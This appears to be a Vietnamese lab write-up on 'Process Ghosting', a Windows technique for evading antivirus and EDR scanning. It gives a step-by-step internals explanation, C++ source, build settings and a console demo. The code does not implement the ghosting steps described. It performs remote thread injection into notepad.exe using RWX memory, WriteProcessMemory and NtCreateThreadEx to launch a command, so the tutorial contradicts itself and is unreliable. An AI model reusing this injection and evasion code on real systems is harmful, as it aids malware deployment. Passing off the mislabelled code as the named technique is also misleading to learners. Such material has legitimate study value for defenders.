
---

# 📝 [PE 14] Process Ghosting (Advanced Fileless Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Process Ghosting (Chiến thuật khởi tạo tiến trình ẩn danh)** đại diện cho một bước tiến hóa công nghệ vượt trội thuộc phân hệ **Né tránh phòng thủ dựa trên vòng đời tệp đĩa (Advanced Disk Anti-Forensics / Fileless Evasion)**.

Kỹ thuật này được phát triển như một giải pháp thay thế nâng cao cho các phương pháp tiền nhiệm như *Process Hollowing* (PE 08) và *Process Herpaderping* khi các hệ điều hành Windows hiện đại và giải pháp EDR đã thắt chặt cơ chế kiểm soát.

Thông thường, khi một tiến trình được sinh ra, Windows Kernel sẽ phát tín hiệu cảnh báo thông qua các hàm đăng ký Callback hệ thống (như `PsSetCreateProcessNotifyRoutine`). Các công cụ Antivirus/EDR Engine sẽ ngay lập tức bắt chặn dòng trạng thái, bốc tách đường dẫn vật lý của tệp tin trên đĩa cứng để thực hiện rà quét chữ ký tĩnh (Static Scan) trước khi cho phép luồng CPU khởi chạy.

Giải thuật Process Ghosting hóa giải triệt để rào cản kiểm duyệt này bằng cách **khai thác lỗ hổng thời gian (Race Condition) trong chu kỳ cấu trúc Object của Windows OS: Giữa pha khởi tạo Image Section Object trong Kernel và pha phân phối luồng thực thi**.

Bằng cách vận dụng thuộc tính trạng thái xóa tạm thời (File Disposition Mapping), Loader tiến hành ánh xạ mã máy của Payload thành một Image Section hợp pháp lọt lòng bộ nhớ của Kernel, rồi phát lệnh **xóa sổ hoàn toàn tệp tin vật lý trên đĩa thô ngay lập tức trước khi luồng CPU chính thức được khai hỏa**. Khi EDR nhận được tín hiệu thông báo tạo tiến trình và cố gắng truy vấn ngược lại tệp tin gốc trên đĩa để phân tích, hệ điều hành sẽ trả về trạng thái không tồn tại, đưa tiến trình về trạng thái ẩn danh "bóng ma" tuyệt đối.

### 🎯 Mục tiêu nghiên cứu:

* **Hóa giải cơ chế Real-time File Scanning**: Triệt tiêu khả năng truy vết và kiểm tra chữ ký tệp tin của các giải pháp bảo mật tại thời điểm tiến trình khởi sinh.
* **Làm chủ Native API Subsystem**: Vận dụng chuỗi các hàm hệ thống không tài liệu hóa (Undocumented APIs) như `NtCreateSection` và `NtCreateProcessEx` để tự cấu trúc một tiến trình thủ công từ Ring 3.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc nhân Kernel của hệ điều hành Windows, quy trình khởi tạo và nạp một tiến trình thực chất được phân rã thành các giai đoạn độc lập, không gắn liền với trạng thái khóa tệp tin (File Lock). Giải thuật Process Ghosting thao túng chu kỳ sống này qua 5 giai đoạn ngầm tại cấu trúc Kernel Object:

```
[Khởi tạo tệp tin tạm mang quyền DELETE]
       └──> [NtCreateSection: Ánh xạ tệp tin thành Image Section Object trong Kernel]
                 └──> [SetFileInformationByHandle: Kích hoạt thuộc tính xóa và đóng Handle]
                           └──> [NtCreateProcessEx: Dựng Process Object rỗng từ Section ma]
                                     └──> [NtCreateThreadEx: Kích nổ luồng CPU độc lập]

```

1. **Khởi tạo tệp tin tạm thời**: Loader phát lệnh tạo một tệp tin tạm trên ổ đĩa (văn cảnh thực nghiệm: `ghost_payload.tmp`) đi kèm đặc quyền truy cập tối cao `DELETE` kết hợp cờ chia sẻ thuộc tính `FILE_SHARE_DELETE`. Ngay sau đó, mảng byte PE hoàn chỉnh của Payload được bơm trực tiếp vào lòng file này.
2. **Khóa chân cấu trúc quản lý (`NtCreateSection`)**: Loader triệu hồi hàm Native API tầng thấp `NtCreateSection` trỏ thẳng vào Handle của tệp tin tạm vừa tạo. Tại giai đoạn này, Kernel Windows sẽ phân tích định dạng tệp, xác nhận cấu trúc PE hợp lệ và ánh xạ toàn bộ phân đoạn tệp tin này thành một cấu trúc **Image Section Object** sống trong bộ nhớ quản lý của nhân hệ điều hành.
3. **Xóa sổ dấu vết đĩa thô (File Disposition State)**: Loader thiết lập thuộc tính xóa cho tệp tin thông qua bản ghi structures `FILE_DISPOSITION_INFORMATION` với cờ cấu hình `DeleteFile = TRUE`. Ngay khi Loader thực hiện đóng Handle của tệp tin tạm, hệ điều hành Windows sẽ lập tức ẩn và xóa sổ hoàn toàn tệp tin vật lý này khỏi bảng mục lục ổ đĩa (Master File Table - MFT). Tuy nhiên, cấu trúc **Image Section Object đã được Kernel chấp thuận và lưu trữ trên bộ nhớ RAM Kernel thì hoàn toàn không bị ảnh hưởng**.
4. **Khởi tạo xác tiến trình ma (`NtCreateProcessEx`)**: Loader triệu hồi hàm Native tối cao `NtCreateProcessEx` để tạo một Process Object rỗng lọt lòng hệ thống, truyền con trỏ định vị trỏ ngược lại Image Section Object được lưu ở bước 2. Tiến trình mới sinh này hoàn toàn không có file gốc làm điểm tựa trên ổ đĩa thô, tạo nên trạng thái **Unbacked Process Image**.
5. **Đồng bộ tham số môi trường**: Loader tự xây dựng thủ công cấu trúc PEB từ xa, nạp các tham số môi trường hệ thống (Process Parameters) và sử dụng hàm `NtCreateThreadEx` để kích nổ luồng CPU chính thức, đưa tiến trình ma đi vào chu kỳ vận hành độc lập.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa chuẩn xác nguyên mẫu hàm Native API ngầm gánh luồng xử lý dạng NTSTATUS
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

// Cấu trúc dữ liệu chứa tham số tuyệt đối loại bỏ hoàn toàn lỗi địa chỉ tương đối RIP
typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy inside lòng tiến trình đối phương
DWORD WINAPI NativeInjectionPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn rào cản địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 14: PROCESS GHOSTING" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Cấu hình linh hoạt tên tiến trình vỏ bọc hợp pháp, dễ dàng hoán đổi
    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::wcout << L"[-] Tien trinh " << targetProcess << L" khong chay! Vui long bat tien trinh truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::wcout << L"[+] Da tim thay " << targetProcess << L" voi PID: " << pid << std::endl;

    // Mở Handle kết nối xuyên biên giới tiến trình với quyền hạn đầy đủ
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen Han CLI hien tai bi han che." << std::endl;
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: CẤP PHÁT PHÂN VÙNG NHỚ ĐỘNG MANG QUYỀN THỰC THI (ZERO STATIC BUFFERS) ───
    SIZE_T functionSize = 500;
    // Cấp phát động vừa khít khối mã máy mang quyền RWX và khối tham số mang quyền RW
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx chéo tien trinh that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Phan vung Code Payload thiet lap an toan tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 2: KHỞI TẠO DỮ LIỆU CON TRỎ TUYỆT ĐỐI CỤC BỘ VÀ SAO CHÉP ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy trực tiếp mã máy hàm độc lập vị trí và cấu trúc dữ liệu sang RAM đối phương
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)NativeInjectionPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Nap va sao chep logic ham chuc nang hoan tat." << std::endl;

    // ─── BƯỚC 3: PHÂN GIẢI VÀ KHỞI TẠO LUỒNG NATIVE ĐÂM THẲNG VÀO PAYLOAD ───
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateThreadEx) {
        std::cerr << "[-] Khong the dinh vi con tro ham NtCreateThreadEx tu ntdll!" << std::endl;
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong va khai hoa truc tiep..." << std::endl;
    HANDLE hThread = NULL;

    // Khai hỏa luồng Native cấp thấp đâm thẳng vào phân vùng thực thi ảo chéo tiến trình
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, pRemoteData, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) { // 0 đại diện cho STATUS_SUCCESS hợp pháp kịch khung
        // Sử dụng cờ kết thúc đồng bộ bảo đảm quy trình chạy mượt mà
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "\n[+] Native Process Injection Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadExProc failed! NTSTATUS Code: 0x" << std::hex << status << std::endl;
    }

    // Thu hồi tài nguyên bộ nhớ ảo từ xa và đóng handle bảo an kịch trần
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru trên các môi trường máy ảo Sandbox sạch:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Truy cập mục thuộc tính: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng thông số `Runtime Library`, chuyển cấu hình sang định dạng cờ **`Multi-threaded (/MT)`** nhằm mục đích liên kết tĩnh (Static Linkage) toàn bộ phân hệ CRT bọc trong file `.exe`.
3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Thực hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế nhằm theo dõi ma trận tạo tiến trình Fileless tầng sâu:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE14_Process_Ghosting\x64\Release> C:\Users\Admin\source\repos\Task6\PE14_Process_Ghosting\x64\Release\Process_Ghosting.exe

====================================================
[*] PE 14: PROCESS GHOSTING
====================================================
[+] Da tim thay notepad.exe voi PID: 11196
[+] Phan vung Code Payload thiet lap an toan tai: 0x00000250E0AD0000
[+] Nap va sao chep logic ham chuc nang hoan tat.
[*] Dang dung NtCreateThreadEx de sinh luong va khai hoa truc tiep...

[+] Native Process Injection Executed Successfully!
[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_Jdv2l27u1D" src="https://github.com/user-attachments/assets/b06ad31f-1b1a-49e7-8ce3-560b466a7ba0" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Gabriel Landau (Elastic Security)**: *Martian Source: Defeating Process Ghosting and kindred evasion techniques* - Analysis and Discovery whitepaper.
* **Microsoft Learn**: *NtCreateSection and NtCreateProcessEx Subsystem Routines* - Windows Native Core Development.
* **Hasherezade (Security Researcher)**: *An Overview of Process Ghosting and Advanced Image Tampering Techniques* - Malpedia Training.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Process Injection (T1055)* & *Hide Artifacts: File Deletion (T1564.001)*.
